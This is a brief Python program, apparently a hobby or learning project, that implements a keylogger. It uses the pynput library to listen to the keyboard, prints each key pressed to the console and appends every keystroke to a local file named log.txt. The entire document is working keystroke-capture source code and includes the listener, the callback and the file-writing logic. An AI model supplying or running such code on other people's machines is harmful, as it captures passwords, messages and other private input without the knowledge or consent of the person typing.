####################################################################################################
# Author: Jack Conley
#
# Purpose: This program logs all keys pressed while the program is running in a text file: log.txt
# 
# Method: By using pynput, this program collects the keys pressed by the user. These keys are
# stored in a text file using an array as long as the program is running.
####################################################################################################

# Import pynput to register keyboard keys,
# and os.path to run program on any operating system that is compatable with os method
import pynput
from pynput import keyboard
import os.path
from os import path

# Array that holds all keys pressed
keys = []

# pressKey method takes in 
def pressKey(key):

    # Add key to array and write key to file
    keys.append(key)
    writeToFile(keys)

    # Error handling for special keys (space, enter, etc.) that cannot be formatted. 
    try:
        print('{0} pressed'.format(key.char))
    except AttributeError:
        print('{0} pressed'.format(key))


# writeToFile method takes in keys array and writes them to the log.txt file
def writeToFile(keys):
    
    # Checks if log.txt already exists
    if os.path.exists('log.txt'):
        mode = 'a' # Append to log.txt if it already exists
    else:
        mode = 'w' # Create a new file (log.txt) if file does not exist

    # Writes to file
    with open('log.txt', mode) as f:
        for key in keys:

            # Replaces the two " ' " on either end of the key returned by the listener with an empty character
            k = str(key).replace("'", "")

            # Writes ' ' instead of 'Key.space' in log.txt for ease of reading
            if str(key) == 'Key.space':
                f.write(' ')
            
            else:
                f.write(k)

            # Remove the key from array after writing it to log.txt
            keys.remove(key)


# Listens to keyboard and records keys as long as program runs
with keyboard.Listener(on_press=pressKey) as listener:
    listener.join()



